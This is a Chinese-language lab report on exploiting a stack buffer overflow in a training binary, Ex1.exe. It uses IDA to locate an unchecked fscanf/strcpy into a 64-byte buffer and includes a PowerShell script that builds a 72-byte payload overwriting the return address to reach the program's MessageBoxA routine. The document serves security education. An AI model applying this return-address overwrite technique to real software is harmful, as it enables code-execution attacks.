# Ex1 漏洞机理分析与利用实验报告

## 一、实验目的

1. 分析 Windows 控制台程序 `Ex1.exe` 的基本功能和关键逻辑。
2. 理解程序在处理外部数据文件 `password.txt` 时存在的安全缺陷。
3. 在不修改 `Ex1.exe` 的前提下，通过修改 `password.txt`，使程序运行后弹出消息框。
4. 掌握使用 IDA 进行静态分析、定位关键函数和构造漏洞利用数据的基本方法。

## 二、实验环境与工具

| 项目 | 说明 |
| --- | --- |
| 操作系统 | Windows |
| 目标程序 | `Ex1.exe` |
| 数据文件 | `password.txt` |
| 分析工具 | IDA Pro / IDA Free |
| 辅助工具 | PowerShell、十六进制查看工具 |

目标文件基本信息：

```text
Ex1.exe: PE32 executable (console) Intel 80386, for MS Windows
ImageBase: 0x00400000
Subsystem: Windows CUI
```

## 三、实验要求

实验材料包括两个文件：

```text
Ex1.exe
password.txt
```

实验要求为：

> 在不修改 Ex1 程序的情况下，运行程序弹出消息框。

同时要求记录实验过程，撰写并提交漏洞机理分析与利用实验报告。

## 四、实验过程

### 4.1 使用 IDA 加载程序

在 IDA 中选择 `New`，打开 `Ex1.exe`。文件类型选择：

```text
Portable executable for 80386 (PE)
```

等待 IDA 自动分析完成。

> 【截图 1 插入位置：IDA 加载 `Ex1.exe` 后的主界面】

### 4.2 查看字符串和导入表

按 `Shift + F12` 打开字符串窗口，可以看到以下关键字符串：

```text
password.txt
%s
Incorrect password!
Congratulation!
You have passed the verification!
```

其中 `password.txt` 的地址为：

```text
0x00409034
```

同时打开导入表，可以看到程序导入了：

```text
MessageBoxA
ExitProcess
fopen
fscanf
fclose
strcpy
strcmp
```

> 【截图 2 插入位置：IDA 字符串窗口，高亮 `password.txt` 和提示信息】
>
> 【截图 3 插入位置：IDA Imports 窗口，高亮 `MessageBoxA`】

### 4.3 定位主函数

通过 `password.txt` 字符串的交叉引用，可以定位到主逻辑函数：

```text
0x0040107F
```

该函数的主要逻辑如下：

```c
FILE *fp = fopen("password.txt", "r");
char buf[0x404];

fscanf(fp, "%s", buf);
fclose(fp);

if (check_password(buf) == 0) {
    printf("Congratulation!\n");
    printf("You have passed the verification!\n");
    show_message_box();
} else {
    printf("Incorrect password!\n");
}
```

主函数中的关键调用包括：

```text
0x0040109C    call fopen
0x004010C4    call fscanf
0x004010D0    call fclose
0x004010DF    call check_password
0x00401117    call show_message_box
```

> 【截图 4 插入位置：IDA 中 `0x0040107F` 主函数的反汇编视图，标注 `fopen`、`fscanf`、`fclose` 和校验函数调用】

### 4.4 定位密码校验函数

从主函数中的：

```asm
call sub_401000
```

进入密码校验函数：

```text
0x00401000
```

该函数开头连续写入 9 个字节：

```asm
mov byte ptr [ebp-0Ch], 37h
mov byte ptr [ebp-0Bh], 48h
mov byte ptr [ebp-0Ah], 3Ah
mov byte ptr [ebp-9],  5Ah
mov byte ptr [ebp-8],  3Eh
mov byte ptr [ebp-7],  36h
mov byte ptr [ebp-6],  59h
mov byte ptr [ebp-5],  2Bh
mov byte ptr [ebp-4],  15h
```

随后通过循环对每个字节加 `0x19`：

```asm
mov dl, byte ptr [ebp+ecx-0Ch]
add dl, 19h
mov byte ptr [ebp+eax-0Ch], dl
```

计算过程如下：

```text
37 + 19 = 50 -> 'P'
48 + 19 = 61 -> 'a'
3A + 19 = 53 -> 'S'
5A + 19 = 73 -> 's'
3E + 19 = 57 -> 'W'
36 + 19 = 4F -> 'O'
59 + 19 = 72 -> 'r'
2B + 19 = 44 -> 'D'
15 + 19 = 2E -> '.'
```

因此生成的字符串为：

```text
PaSsWOrD.
```

> 【截图 5 插入位置：IDA 中 `0x00401000` 校验函数的反汇编视图，标注生成密码的字节和 `add dl, 19h` 循环】

### 4.5 查看伪代码

在 `0x00401000` 函数内按 `F5`，可以得到类似下面的伪代码：

```c
int __cdecl check_password(char *input)
{
    char key[9];
    char buf[64];

    key[0] = 0x37;
    key[1] = 0x48;
    key[2] = 0x3A;
    key[3] = 0x5A;
    key[4] = 0x3E;
    key[5] = 0x36;
    key[6] = 0x59;
    key[7] = 0x2B;
    key[8] = 0x15;

    for (int i = 0; i < 9; i++) {
        key[i] += 0x19;
    }

    strcpy(buf, input);
    return strcmp(buf, key);
}
```

> 【截图 6 插入位置：IDA 伪代码窗口，标注 `strcpy(buf, input)` 和 `strcmp(buf, key)`】

### 4.6 定位消息框函数

在 Imports 窗口中找到：

```text
MessageBoxA
```

通过交叉引用可以定位到调用位置：

```asm
call ds:MessageBoxA
```

该调用位于：

```text
0x004011A7
```

所属函数为：

```text
0x00401125
```

该函数会构造消息框文本和标题，并最终调用 `MessageBoxA`。

> 【截图 7 插入位置：IDA 中 `0x00401125` 函数的反汇编视图，高亮 `call ds:MessageBoxA`】

## 五、漏洞机理分析

### 5.1 漏洞类型

本程序存在典型的栈缓冲区溢出漏洞。

漏洞点位于密码校验函数：

```c
char buf[64];
strcpy(buf, input);
```

`buf` 的大小为 64 字节，但 `strcpy` 不会检查输入长度。同时，主函数读取文件时使用了：

```c
fscanf(fp, "%s", buf);
```

`%s` 格式也没有限制读取长度，因此攻击者可以通过 `password.txt` 传入超长数据。

### 5.2 栈帧结构

校验函数 `0x00401000` 的栈帧大致如下：

```text
[ebp - 0x40]    buf，输入缓冲区
...
[ebp - 0x0C]    key，程序生成的密码字符串
[ebp - 0x10]    result，strcmp 返回值
[ebp + 0x00]    保存的 EBP
[ebp + 0x04]    返回地址
```

从 `buf` 起点开始计算：

```text
偏移 0x40 = 64 字节：保存的 EBP
偏移 0x44 = 68 字节：返回地址
```

因此覆盖返回地址需要：

```text
68 字节填充 + 4 字节目标地址
```

> 【截图 8 插入位置：IDA 栈帧窗口，标注 `var_40`、保存的 EBP、返回地址和偏移 `0x44`】

### 5.3 选择跳转目标

程序内部负责弹出消息框的函数位于：

```text
0x00401125
```

该函数内部调用：

```text
MessageBoxA(NULL, "Congratulations!", "SS_VUL", MB_OK)
```

将 `0x00401125` 写成小端字节序：

```text
25 11 40 00
```

## 六、漏洞利用过程

### 6.1 尝试直接使用口令

最初尝试将 `password.txt` 修改为：

```text
PaSsWOrD.
```

但在实际运行中程序仍然输出：

```text
Incorrect password!
```

原因是程序生成的 9 字节密钥没有显式补 `\0` 结束符，`strcmp` 可能继续比较栈上的其他数据。因此直接输入口令的方式不稳定。

> 【截图 9 插入位置：`password.txt` 内容为 `PaSsWOrD.` 时，程序输出 `Incorrect password!` 的现象】

### 6.2 构造溢出载荷

最终采用覆盖返回地址的方法。载荷结构为：

```text
68 字节 'A' + 返回地址 0x00401125
```

总长度为：

```text
72 字节
```

使用 PowerShell 生成 `password.txt`：

```powershell
$payload = New-Object byte[] 72

for ($i = 0; $i -lt 68; $i++) {
    $payload[$i] = 0x41
}

$payload[68] = 0x25
$payload[69] = 0x11
$payload[70] = 0x40
$payload[71] = 0x00

[IO.File]::WriteAllBytes("$((Get-Location).Path)\password.txt", $payload)

Format-Hex .\password.txt
```

生成的文件十六进制如下：

```text
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
...
41 41 41 41 25 11 40 00
```

> 【截图 10 插入位置：PowerShell 执行生成 payload 的命令】
>
> 【截图 11 插入位置：`Format-Hex` 显示 `password.txt` 的十六进制内容，标出最后的 `25 11 40 00`】

### 6.3 运行程序

在 `Ex1.exe` 所在目录执行：

```powershell
.\Ex1.exe
```

程序跳转到 `0x00401125`，并调用 `MessageBoxA`，弹出消息框。

预期消息框内容为：

```text
Congratulations!
```

标题为：

```text
SS_VUL
```

> 【截图 12 插入位置：运行 `Ex1.exe` 后弹出的消息框】

## 七、实验结果

通过修改 `password.txt`，在不修改 `Ex1.exe` 的情况下，程序成功弹出消息框，实验目标完成。

关闭消息框后程序可能因栈被破坏而异常退出，这属于本次栈溢出利用的正常现象。

## 八、实验总结

本实验完成了以下工作：

1. 使用 IDA 定位了主函数、密码校验函数和消息框函数。
2. 分析了 `fscanf("%s")` 和 `strcpy` 导致的栈缓冲区溢出漏洞。
3. 计算了缓冲区到返回地址的偏移。
4. 构造了 72 字节的溢出载荷，将返回地址覆盖为 `0x00401125`。
5. 成功在不修改目标程序的情况下触发消息框。

通过本实验，进一步理解了以下安全概念：

- 栈帧布局和返回地址覆盖原理；
- 不安全的字符串输入与复制函数可能带来的风险；
- 静态逆向分析在漏洞定位中的作用；
- 漏洞利用数据文件的构造方法。

## 九、截图清单

| 编号 | 截图内容 |
| --- | --- |
| 截图 1 | IDA 加载 `Ex1.exe` 后的主界面 |
| 截图 2 | IDA 字符串窗口，高亮 `password.txt` |
| 截图 3 | IDA Imports 窗口，高亮 `MessageBoxA` |
| 截图 4 | 主函数 `0x0040107F` 的反汇编视图 |
| 截图 5 | 校验函数 `0x00401000` 的反汇编视图 |
| 截图 6 | 校验函数的 F5 伪代码视图 |
| 截图 7 | 消息框函数 `0x00401125` 的反汇编视图 |
| 截图 8 | 校验函数的栈帧窗口 |
| 截图 9 | 直接输入口令失败的现象 |
| 截图 10 | PowerShell 生成 payload 的过程 |
| 截图 11 | `password.txt` 的十六进制内容 |
| 截图 12 | 运行后弹出的消息框 |
